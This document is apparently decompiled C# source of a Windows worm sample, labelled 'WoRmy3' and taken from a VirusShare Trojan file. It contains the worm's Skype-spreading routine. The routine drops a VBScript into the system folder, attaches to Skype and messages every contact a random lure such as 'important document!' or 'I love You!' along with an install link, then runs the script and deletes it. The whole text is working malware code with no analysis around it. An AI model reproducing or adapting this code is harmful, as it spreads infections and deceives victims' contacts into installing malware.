// Decompiled with JetBrains decompiler
// Type: WoRmy3.skype
// Assembly: WoRmy3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1B26AE86-BB0F-48C4-8B57-1FB3CCAD5BD2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.eggt-0a9369ef164691ad2732dc205399f3a03b3ae27182245bcbe5919174ce030c3c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;

namespace WoRmy3
{
  [StandardModule]
  internal sealed class skype
  {
    public static void skype_sp()
    {
      string[] strArray = new string[15];
      VBMath.Randomize();
      strArray[1] = "LOL Wtf ";
      strArray[2] = " pervert isnt it? ";
      strArray[3] = " you wont believe this! ";
      strArray[4] = " HEHE ";
      strArray[5] = " this program costs usually about 50$ but i give it out for free :D ";
      strArray[6] = " Pamela Anderson?! ";
      strArray[7] = " important document! ";
      strArray[8] = " do not open , unless you know what'll happen! ";
      strArray[9] = " this is what you was asking about :) ";
      strArray[10] = " For Sindy ";
      strArray[11] = " I love You! ";
      strArray[12] = " don't even bother ";
      strArray[13] = " are you scared?! ";
      strArray[14] = " watch out for those giants monsters ;) ";
      try
      {
        StreamWriter streamWriter = new StreamWriter((Stream) new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\s4c.vbs", FileMode.Create, FileAccess.Write));
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
        streamWriter.WriteLine("on error resume next");
        streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
        streamWriter.WriteLine("Fruxr.Client.Start()");
        streamWriter.WriteLine("Fruxr.Attach()");
        streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
        streamWriter.WriteLine("Fruxr.SendMessage KZN.handle,\"" + strArray[checked ((int) Math.Round((double) unchecked (Conversion.Int(14f * VBMath.Rnd()) + 1f)))] + "" + install.link + "\"");
        streamWriter.WriteLine("next");
        streamWriter.Close();
        Process.Start("C:\\windows\\system32\\s4c.vbs");
        new FileInfo("C:\\windows\\system32\\s4c.vbs").Delete();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
